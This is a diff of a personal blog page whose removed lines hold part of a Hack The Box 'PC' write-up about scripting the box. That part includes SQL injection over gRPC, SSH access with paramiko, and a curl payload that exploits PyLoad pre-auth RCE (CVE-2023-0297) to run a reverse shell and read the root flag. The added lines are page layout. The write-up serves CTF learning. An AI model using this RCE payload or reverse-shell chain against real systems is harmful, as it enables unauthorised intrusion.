+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
 
-    print(&#34;Users found&#34;)
-    print(json.dumps(users))
+        <span class="tag"><a href="https://baishya.xyz/tags/htb/">htb</a></span>
+        <span class="tag"><a href="https://baishya.xyz/tags/automation/">automation</a></span>
+        
+    </p>
 
-    return users
-</code></pre>
-                        <p>The <code>_sql_injection_request</code> function is defined as:</p>
-                        <pre tabindex="0"><code>def _sql_injection_request(self, query):
-    metadata = ((&#34;token&#34;, self.token),)
-    id_request = pb2.getInfoRequest(id=query)
-    r = self.stub.getInfo.with_call(id_request, metadata=metadata)
-    return r[0].message
-</code></pre>
-                        <h2 id="getting-user-flag">Getting user flag</h2>
-                        <p>The user list has a user <code>sau</code> , who has SSH access to the machine. The next step
-                            is to start an SSH session and read the user flag stored at <code>/home/sau/user.txt</code>.
-                            This is quite straightforward. I created a simple SSH Client using the <code>paramiko</code>
-                            library and executed <code>cat /home/sau/user.txt</code>:</p>
-                        <pre tabindex="0"><code>def exec_command(self, command):
-    ssh_stdin, ssh_stdout, ssh_stderr = self.client.exec_command(command)
-    return ssh_stdout.read().decode(&#34;utf-8&#34;)
-</code></pre>
-                        <h2 id="pyload-cve">PyLoad CVE</h2>
-                        <p>PyLoad is an open-source download manager. PyLoad versions prior to 0.5.0b3.dev31 are
-                            vulnerable to pre-auth RCE (CVE-2023–0297). There are many available exploits for this
-                            vulnerability. You can read more about the vulnerability and the exploit <a
-                                href="https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad">here</a>.</p>
-                        <p>The vulnerability allows us to execute a payload like this:</p>
-                        <pre tabindex="0"><code>curl -i -s -k -X $&#39;POST&#39; \
---data-binary
-$&#39;jk=pyimport%20os;os.system(\&#34;bash%20/home/sau/shell.sh\&#34;);f=function%20f2()
-{};&amp;package=xxx&amp;crypted=AAAA&amp;&amp;passwords=aaaa&#39; \
-$&#39;http://localhost:8000/flash/addcrypted2&#39;
-</code></pre>
-                        <p>Here, I am running a script called <a
-                                href="https://github.com/anuraagbaishya/htb-pc/blob/main/shell.sh"><code>shell.sh</code></a>
-                            which is just a bash reverse shell.</p>
-                        <p>PyLoad on this box is not available publicly. It can only be accessed from within the box.
-                            The official write-up uses SSH tunneling to tunnel from the user’s machine to the box. I
-                            chose the alternative option of running the exploit from within the SSH session, using the
-                            same <code>exec_command</code> function I used to read the user flag.</p>
-                        <p>I used SFTP to transfer the reverse shell to the box:</p>
-                        <pre tabindex="0"><code>def transfer_file_from_local(self):
-    ftp_client = self.client.open_sftp()
-    ftp_client.put(&#34;shell.sh&#34;, &#34;/home/sau/shell.sh&#34;)
-</code></pre>
-                        <p>The last step is to start a reverse shell listener and then read the root flag from within
-                            the reverse shell session. For this, I created a simple <a
-                                href="https://github.com/anuraagbaishya/htb-pc/blob/main/revsh.py">socket client</a>
-                            which listens for a connection and then performs <code>cat /root/root.txt</code>.</p>
-                        <p>I ran both the exploitation script and the socket client as two separate processes using a
-                            shell script:</p>
-                        <pre tabindex="0"><code>#! /bin/bash
+      
 
-python auto_exploit.py &amp;
-python revsh.py
-</code></pre>
-                        <p>It might (should) be possible to run the exploitation part and socket listener as separate
-                            threads of the same process. I tried for a bit, but it didn’t work and I just chose the easy
-                            way out.</p>
-                        <p>Running the runner script, I got both the user and root flags:</p>
-                        <p><img src="/flags.webp" alt="Flags"></p>
-                        <h2 id="closing-thoughts">Closing Thoughts</h2>
-                        <p>This experiment was a lot of fun. After completing this box, I pondered over what makes a box
-                            scriptable. I think the correct answer is — all boxes are scriptable if one is willing to
-                            persevere. The more practical questions what makes a box easy to script. I have come up with
-                            these criteria:</p>
-                        <ul>
-                            <li>Requires little to no UI interaction like clicking buttons, filing forms, etc that
-                                cannot be replicated using direct web / API calls. It might be possible to replicate
-                                these functionalities using selenium or similar — but that increases the complexity of
-                                the script.</li>
-                            <li>Related to the above — requires performing operations using some software running on one
-                                of the open ports or the machine. These might be web UIs or even CLI programs installed
-                                in the box.</li>
-                            <li>Has a lot of steps / requires running a lot of tools. The time required to create the
-                                script will be directly proportionate to the number of steps.</li>
-                        </ul>
-                        <p>This was the first (and only) box I have tried to script. I have done a few other boxes after
-                            this one, but I did not spend time trying to script them because of one of the above
-                            reasons. As I complete more boxes, I will continue to assess if the box is easy to script.
-                            If yes, great! If not, it may have to do with one of the above reasons, or I might have some
-                            other new reasons.</p>
-                        <p>That’s it from me. This is my 2023 contribution to my blog. I will not promise anything else
-                            here till a really long time has passed since this publication. I usually don’t work on
-                            technical things during my free time. Most (if not all) of the security work I do is by
-                            virtue of my employment. Therefore, there usually is not much for me to share.</p>
-                        <p>Thanks for reading!</p>
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        1250 Words
+      </p>
 
-                    </div>
-                </article>
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2023-11-06 20:05
+        
 
-                <hr />
+         
+          
+        
+      </p>
+    </div>
 
-                <div class="post-info">
+    
+    <div class="pagination">
+        
 
-                    <p>
-                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
-                            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
-                            class="feather feather-tag meta-icon">
-                            <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z">
-                            </path>
-                            <line x1="7" y1="7" x2="7" y2="7"></line>
-                        </svg>
+        <div class="pagination__buttons">
+            
+            <span class="button previous">
+                <a href="https://baishya.xyz/posts/types-of-interviews/">
+                    <span class="button__icon">←</span>
+                    <span class="button__text">Tales from my Product Security Job Hunt: Part 1, Interview Types</span>
+                </a>
+            </span>
+            
 
-                        <span class="tag"><a href="https://baishya.xyz/tags/untagged/">untagged</a></span>
-
-                    </p>
-
-
-
-                    <p>
-                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
-                            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
-                            class="feather feather-file-text">
-                            <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
-                            <polyline points="14 2 14 8 20 8"></polyline>
-                            <line x1="16" y1="13" x2="8" y2="13"></line>
-                            <line x1="16" y1="17" x2="8" y2="17"></line>
-                            <polyline points="10 9 9 9 8 9"></polyline>
-                        </svg>
-                        1250 Words
-                    </p>
-
-                    <p>
-                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
-                            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
-                            class="feather feather-calendar">
-                            <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
-                            <line x1="16" y1="2" x2="16" y2="6"></line>
-                            <line x1="8" y1="2" x2="8" y2="6"></line>
-                            <line x1="3" y1="10" x2="21" y2="10"></line>
-                        </svg>
-
-                        2024-01-29 20:05
-
-
-
-
-
-                    </p>
-                </div>
-
-
-                <div class="pagination">
-
-
-                    <div class="pagination__buttons">
-
-
-
-                        <span class="button next">
-                            <a href="https://baishya.xyz/posts/interview-prep/">
-                                <span class="button__text">Tales from my Product Security Job Hunt: Part 2,
-                                    Preparation</span>
-                                <span class="button__icon">→</span>
-                            </a>
-                        </span>
-
-                    </div>
-                </div>
-
-
-
-
-
-
-
-
-            </main>
-
+            
         </div>
-
-
-        <footer class="footer">
-
-            <div class="footer__inner">
-                <div class="footer__content">
-                    <span>&copy; 2024</span>
-
-
-
-                    <span>Anuraag Baishya</span>
-                </div>
-            </div>
-
-
-            <div class="footer__inner">
-                <div class="footer__content">
-                    <span>Powered by <a href="http://gohugo.io">Hugo</a></span><span>Using <a
-                            href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello Friend NG</a>
-                        theme</span>
-                </div>
-            </div>
-
-        </footer>
-
-
     </div>
 
 
+    
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2024</span>
+            
+            
+            
+            <span>Anuraag Baishya</span>
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a> & <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello Friend NG</a> theme</span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+<script type="text/javascript" src="/bundle.min.4037dc94fd1565c4fd3354e2b4a2d1ff11842c906242435350b4d2d8d6e8b7890da46c0a865173f543a6161c1f4d1c94147f1b907db36489fc2bf5e20d4af75c.js" integrity="sha512-QDfclP0VZcT9M1TitKLR/xGELJBiQkNTULTS2Nbot4kNpGwKhlFz9UOmFhwfTRyUFH8bkH2zZIn8K/XiDUr3XA=="></script>
 
 
 
-    <script type="text/javascript"
-        src="/bundle.min.ac2a4bcaed631ec2dc154407be7f09fc28da37de71fae6dee6711b2a3d1622770f87d3cda22c460e9a68ff619bdb1dd75cb7a5d33f159a54e419736cc4541087.js"
-        integrity="sha512-rCpLyu1jHsLcFUQHvn8J/CjaN95x&#43;ube5nEbKj0WIncPh9PNoixGDppo/2Gb2x3XXLel0z8VmlTkGXNsxFQQhw=="></script>
 
-
-
-
-</body>
-
+    </body>
 </html>
